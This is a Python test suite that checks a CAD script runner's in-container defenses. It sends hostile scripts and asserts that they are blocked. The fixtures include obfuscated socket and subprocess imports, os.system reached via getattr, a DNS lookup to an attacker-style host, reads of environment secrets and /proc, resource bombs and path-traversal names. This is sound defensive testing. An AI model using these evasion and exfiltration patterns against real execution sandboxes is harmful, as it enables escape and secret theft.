"""
Adversarial proof suite for the CAD sidecar (MTR-187).

Each test drives a deliberately hostile script through the real HTTP layer
(FastAPI TestClient, same as test_app.py) and asserts the attack is BLOCKED or
BOUNDED — never that it succeeds silently. These exercise the in-container
defense-in-depth, NOT a sandbox: the honest threat model and residual risks are
documented in cad-runner/README.md ("Security"). What this suite proves is that
the cheap, in-process controls actually fire:

  - pre-exec AST denylist (validate.py) rejects literal egress/spawn imports;
  - a PEP-578 audit hook blocks egress/spawn even when the import is obfuscated
    past the AST check (the "one-line bypass" validate.py concedes);
  - the runner secret is scrubbed from the child's os.environ;
  - per-exec + per-session resource caps bound CPU / memory / output / exec
    count, and a runaway child never takes the service down;
  - path traversal via a `parts` key cannot escape the temp dir;
  - a finished session's private temp tree is gone (no cross-session read).

Runs on plain Python (engine="mesh") — no CAD kernel needed. Run:
`python3 cad-runner/tests/test_adversarial.py`.
"""
import os
import sys
import time
import traceback
from pathlib import Path

# app.py fails closed without a secret; set BOTH an allow-no-auth override AND a
# sentinel secret value, so the env-scrub test has something concrete to assert
# is NOT reachable from generated code.
os.environ["CAD_RUNNER_ALLOW_NO_AUTH"] = "true"
SECRET_SENTINEL = "sk-CADRUNNER-SENTINEL-do-not-leak-42"
os.environ["CAD_RUNNER_SECRET"] = SECRET_SENTINEL

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

import app as app_module  # noqa: E402
from fastapi.testclient import TestClient  # noqa: E402

# TestClient sends the bearer so authed endpoints work; the point under test is
# code execution, not auth.
client = TestClient(
    app_module.app, headers={"Authorization": f"Bearer {SECRET_SENTINEL}"}
)


def run(code, expect_status=200, **extra):
    body = {"code": code, "formats": ["stl"], "engine": "mesh", **extra}
    r = client.post("/run", json=body)
    assert r.status_code == expect_status, f"/run -> {r.status_code}: {r.text[:300]}"
    return r.json()


def create_session(engine="mesh"):
    r = client.post("/session", json={"engine": engine})
    assert r.status_code == 200, f"/session -> {r.status_code}: {r.text[:300]}"
    return r.json()["sessionId"]


def sess_exec(sid, code, expect_status=200, **extra):
    r = client.post(
        f"/session/{sid}/exec",
        json={"code": code, "formats": ["stl"], "allowRemesh": False, **extra},
    )
    assert r.status_code == expect_status, (
        f"exec -> {r.status_code} (wanted {expect_status}): {r.text[:300]}"
    )
    return r.json() if expect_status == 200 else None


def delete_session(sid):
    client.delete(f"/session/{sid}")


def _err(payload):
    return (payload.get("error") or "").lower()


# --- 1. network egress -----------------------------------------------------
def test_network_egress_literal_import_rejected():
    """A literal `import socket` + connect is rejected pre-exec by the AST
    denylist — it never reaches the interpreter."""
    p = run(
        "import socket\n"
        "s = socket.socket()\n"
        "s.connect(('93.184.216.34', 80))\n"
        "result = 1\n"
    )
    assert p["ok"] is False
    assert "rejected before execution" in _err(p), p
    assert "socket" in _err(p), p


def test_network_egress_obfuscated_import_blocked_by_audit_hook():
    """The obfuscated egress path (no literal `import socket`, so the AST check
    passes) is stopped at the syscall by the audit hook: the connect raises,
    the run fails, and NOTHING is exfiltrated."""
    p = run(
        "mod = __import__('socket')\n"
        "s = mod.socket(mod.AF_INET, mod.SOCK_STREAM)\n"
        "s.connect(('93.184.216.34', 80))\n"
        "import trimesh\n"
        "result = trimesh.creation.box(extents=(5,5,5))\n"
    )
    assert p["ok"] is False, "connect must not succeed"
    assert "blocked operation" in _err(p) or "socket.connect" in _err(p), p


def test_dns_resolution_blocked_by_audit_hook():
    """Even a bare DNS lookup (a classic exfil-over-DNS primitive) is blocked."""
    p = run(
        "s = __import__('socket')\n"
        "s.getaddrinfo('exfil.attacker.example', 443)\n"
        "result = 1\n"
    )
    assert p["ok"] is False
    assert "blocked operation" in _err(p) or "getaddrinfo" in _err(p), p


# --- 2. process spawn ------------------------------------------------------
def test_subprocess_literal_import_rejected():
    p = run("import subprocess\nsubprocess.Popen(['id'])\nresult = 1\n")
    assert p["ok"] is False
    assert "rejected before execution" in _err(p) and "subprocess" in _err(p), p


def test_subprocess_obfuscated_blocked_by_audit_hook():
    """`__import__('subprocess').Popen(...)` slips past the AST denylist but the
    audit hook blocks subprocess.Popen at the interpreter level."""
    p = run(
        "m = __import__('subprocess')\n"
        "m.Popen(['/bin/echo', 'pwned'])\n"
        "result = 1\n"
    )
    assert p["ok"] is False
    assert "blocked operation" in _err(p) or "popen" in _err(p), p


def test_os_system_blocked_by_audit_hook():
    """os.system reached via getattr (os itself is legitimately importable) is
    blocked by the audit hook."""
    p = run(
        "import os\n"
        "getattr(os, 'sys' + 'tem')('touch /tmp/pwned_by_cad')\n"
        "result = 1\n"
    )
    assert p["ok"] is False
    assert "blocked operation" in _err(p) or "os.system" in _err(p), p
    assert not os.path.exists("/tmp/pwned_by_cad"), "os.system actually ran!"


# --- 3. /proc probing + secret isolation -----------------------------------
def test_runner_secret_scrubbed_from_child_env():
    """Generated code reading os.environ must NOT see the runner secret — it is
    scrubbed from the child before untrusted code runs, so it can't be returned
    via stdout to the model/agent."""
    sid = create_session()
    try:
        p = sess_exec(
            sid,
            "import os\n"
            "print('SECRET=' + repr(os.environ.get('CAD_RUNNER_SECRET')))\n"
            "print('KEYS=' + ','.join(k for k in os.environ if 'SECRET' in k.upper()))\n",
        )
        out = p.get("stdout", "")
        assert SECRET_SENTINEL not in out, f"runner secret leaked via os.environ: {out!r}"
        assert "SECRET=None" in out, out
    finally:
        delete_session(sid)


def test_proc_probing_is_bounded():
    """A script may read its own /proc (we don't pretend to block filesystem
    reads in-process), but the probe cannot escalate: the secret isn't in
    os.environ, and any data it gathers cannot be egressed (network blocked).
    We assert the probe runs without crashing the service and that the runner
    secret is not reachable through os.environ from the probe."""
    sid = create_session()
    try:
        p = sess_exec(
            sid,
            "import os\n"
            "data = ''\n"
            "try:\n"
            "    data = open('/proc/self/status').read()\n"
            "except Exception as e:\n"
            "    data = 'err:' + str(e)\n"
            "print('read_len=' + str(len(data)))\n"
            "print('env_secret=' + repr(os.environ.get('CAD_RUNNER_SECRET')))\n",
        )
        out = p.get("stdout", "")
        assert "read_len=" in out, out
        assert SECRET_SENTINEL not in out, f"secret leaked through probe: {out!r}"
        # Service still healthy after the probe.
        assert client.get("/health").json()["ok"] is True
    finally:
        delete_session(sid)


# --- 4. cross-session isolation --------------------------------------------
def test_cross_session_namespace_isolation():
    """Two sessions are separate processes with separate namespaces: session B
    cannot read a variable session A defined."""
    a = create_session()
    b = create_session()
    try:
        sess_exec(a, "leaked_secret_value = 'SESSION_A_ONLY'\n")
        p = sess_exec(b, "print('seen=' + repr(globals().get('leaked_secret_value')))\n")
        assert "seen=None" in p.get("stdout", ""), p.get("stdout")
    finally:
        delete_session(a)
        delete_session(b)


def test_cross_session_temp_files_cleaned_on_close():
    """A finished session's private temp tree is removed, so a later session
    cannot read files the first one wrote under TMPDIR (temporal isolation).
    (Same-uid CONCURRENT peers are a documented residual risk — not claimed
    here.)"""
    a = create_session()
    p = sess_exec(
        a,
        "import tempfile, os\n"
        "fd, path = tempfile.mkstemp(prefix='sentinelA-')\n"
        "os.write(fd, b'SESSION_A_SECRET_BYTES')\n"
        "os.close(fd)\n"
        "print('PATH=' + path)\n",
    )
    out = p.get("stdout", "")
    assert "PATH=" in out, out
    leaked_path = out.split("PATH=", 1)[1].strip().splitlines()[0]
    delete_session(a)  # tears down A's private tmpdir tree

    b = create_session()
    try:
        p = sess_exec(
            b,
            f"content = None\n"
            f"try:\n"
            f"    content = open({leaked_path!r}).read()\n"
            f"except Exception as e:\n"
            f"    content = 'unreadable:' + type(e).__name__\n"
            f"print('B_SEES=' + repr(content))\n",
        )
        out = p.get("stdout", "")
        assert "SESSION_A_SECRET_BYTES" not in out, f"cross-session read succeeded: {out!r}"
        assert "unreadable:" in out, out
    finally:
        delete_session(b)


# --- 5. resource bombs -----------------------------------------------------
def test_cpu_bomb_is_killed_and_service_survives():
    """A busy-loop is cut down by the per-run CPU limit; the service stays up
    and serves the next request."""
    os.environ["CAD_RUN_CPU_S"] = "3"
    try:
        t0 = time.time()
        p = run("\nwhile True:\n    x = 1\n")
        elapsed = time.time() - t0
        assert p["ok"] is False, p
        assert elapsed < 55, f"CPU bomb ran {elapsed:.0f}s — cap did not bite"
    finally:
        os.environ.pop("CAD_RUN_CPU_S", None)
    # Service survived: a normal run still works.
    ok = run("import trimesh\nresult = trimesh.creation.box(extents=(4,4,4))\n")
    assert ok["ok"] is True, ok.get("error")


def test_memory_bomb_is_bounded():
    """A giant allocation trips RLIMIT_AS (8 GB default) and fails as a bounded
    error, not an OOM-kill of the whole container."""
    p = run(
        "buf = bytearray(9 * 1024 * 1024 * 1024)  # 9 GB > RLIMIT_AS\n"
        "result = len(buf)\n"
    )
    assert p["ok"] is False, p
    # A caught MemoryError (which stringifies to "") or a no-result child death
    # are both bounded outcomes — never a successful 9 GB allocation. The key
    # proof is that `result` (the alloc length) never came back and the service
    # is still healthy.
    assert not p.get("geometry") and not (p.get("files") or {}).get("stl"), p
    assert client.get("/health").json()["ok"] is True


def test_output_flood_is_capped():
    """A script that would emit a huge artifact is capped: the file is dropped
    with an explanatory error rather than shipping a multi-GB base64 blob."""
    os.environ["CAD_MAX_OUTPUT_BYTES"] = "2000"  # 2 KB cap for the test
    try:
        p = run(
            "import trimesh\n"
            "result = trimesh.creation.icosphere(subdivisions=4, radius=20)\n"
        )
        # The STL for a subdiv-4 icosphere is far over 2 KB, so it is dropped.
        assert "stl" not in (p.get("files") or {}), "oversized STL was not capped"
        assert "output cap" in _err(p), p
    finally:
        os.environ.pop("CAD_MAX_OUTPUT_BYTES", None)


# --- 6. path traversal -----------------------------------------------------
def test_parts_name_path_traversal_is_sanitized():
    """A malicious `parts` key with path separators / `..` is sanitized to
    [A-Za-z0-9-], so it cannot write outside the harness temp dir."""
    escape_targets = ["/tmp/cad_escape_test.stl", "/tmp/etc_escape.stl"]
    for t in escape_targets:
        try:
            os.remove(t)
        except OSError:
            pass
    p = run(
        "import trimesh\n"
        "b = trimesh.creation.box(extents=(4,4,4))\n"
        "parts = {'../../tmp/cad_escape_test': b, '../etc_escape': b}\n"
    )
    # The run itself succeeds (names are sanitized, not rejected) and no file
    # landed at the traversal target.
    for t in escape_targets:
        assert not os.path.exists(t), f"path traversal wrote {t}!"
    assert "parts" in p, p
    # Sanitized stems carry no path separators.
    for part in p["parts"]:
        # The echoed name is the raw key, but the exported stem is sanitized;
        # assert the export produced a file blob (stayed inside tmp).
        assert isinstance(part.get("name"), str)


# --- 7. per-session cumulative caps ----------------------------------------
def test_session_exec_count_cap():
    """Past CAD_SESSION_MAX_EXECS, the session refuses further execs and dies."""
    os.environ["CAD_SESSION_MAX_EXECS"] = "2"
    try:
        sid = create_session()
        assert sess_exec(sid, "a = 1\n")["ok"] is True
        assert sess_exec(sid, "b = 2\n")["ok"] is True
        # 3rd exec is over budget -> budget error; the child then exits.
        p = sess_exec(sid, "c = 3\n")
        assert p["ok"] is False and "budget" in _err(p), p
        # The session is unusable now: subsequent execs never succeed (the next
        # call surfaces the crash as a non-ok 200, the one after that 410s once
        # the session is marked dead). Assert nothing after the budget runs.
        for _ in range(3):
            r = client.post(f"/session/{sid}/exec", json={"code": "d = 4\n"})
            assert r.status_code in (200, 410), r.text[:200]
            if r.status_code == 200:
                assert r.json()["ok"] is False, "session ran an over-budget exec"
    finally:
        os.environ.pop("CAD_SESSION_MAX_EXECS", None)
        delete_session(sid)


def test_session_cumulative_cpu_cap_kills_session():
    """The per-SESSION CPU ceiling (hard RLIMIT_CPU) SIGKILLs a child that burns
    CPU across execs beyond the budget, even though each single exec stays under
    the per-exec soft cap. Proves the cap is cumulative, not just per-exec."""
    os.environ["CAD_SESSION_CPU_S"] = "2"   # whole-session hard ceiling
    os.environ["CAD_RUN_CPU_S"] = "60"      # per-exec soft cap stays high
    old_timeout = app_module.RUN_TIMEOUT_S
    app_module.RUN_TIMEOUT_S = 20           # parent wall-clock per exec
    try:
        sid = create_session()
        dead = False
        # Each exec burns ~1s of CPU; the 2s session ceiling kills the child
        # within a few execs, surfacing as a crash/410.
        for i in range(8):
            r = client.post(
                f"/session/{sid}/exec",
                json={"code": "t=0\nfor _ in range(30_000_000):\n    t+=1\n"},
            )
            if r.status_code == 410:
                dead = True
                break
            body = r.json()
            if not body.get("ok") and (
                "no result" in _err(body) or "crash" in _err(body)
            ):
                dead = True
                break
        assert dead, "session cumulative CPU ceiling never fired"
    finally:
        os.environ.pop("CAD_SESSION_CPU_S", None)
        os.environ.pop("CAD_RUN_CPU_S", None)
        app_module.RUN_TIMEOUT_S = old_timeout
        delete_session(sid)


TESTS = [
    test_network_egress_literal_import_rejected,
    test_network_egress_obfuscated_import_blocked_by_audit_hook,
    test_dns_resolution_blocked_by_audit_hook,
    test_subprocess_literal_import_rejected,
    test_subprocess_obfuscated_blocked_by_audit_hook,
    test_os_system_blocked_by_audit_hook,
    test_runner_secret_scrubbed_from_child_env,
    test_proc_probing_is_bounded,
    test_cross_session_namespace_isolation,
    test_cross_session_temp_files_cleaned_on_close,
    test_cpu_bomb_is_killed_and_service_survives,
    test_memory_bomb_is_bounded,
    test_output_flood_is_capped,
    test_parts_name_path_traversal_is_sanitized,
    test_session_exec_count_cap,
    test_session_cumulative_cpu_cap_kills_session,
]


def main():
    failures = 0
    for t in TESTS:
        start = time.time()
        try:
            t()
            print(f"PASS  {t.__name__}  ({time.time() - start:.1f}s)")
        except Exception:
            failures += 1
            print(f"FAIL  {t.__name__}")
            traceback.print_exc()
    print(f"\n{len(TESTS) - failures}/{len(TESTS)} adversarial tests passed")
    sys.exit(1 if failures else 0)


if __name__ == "__main__":
    main()
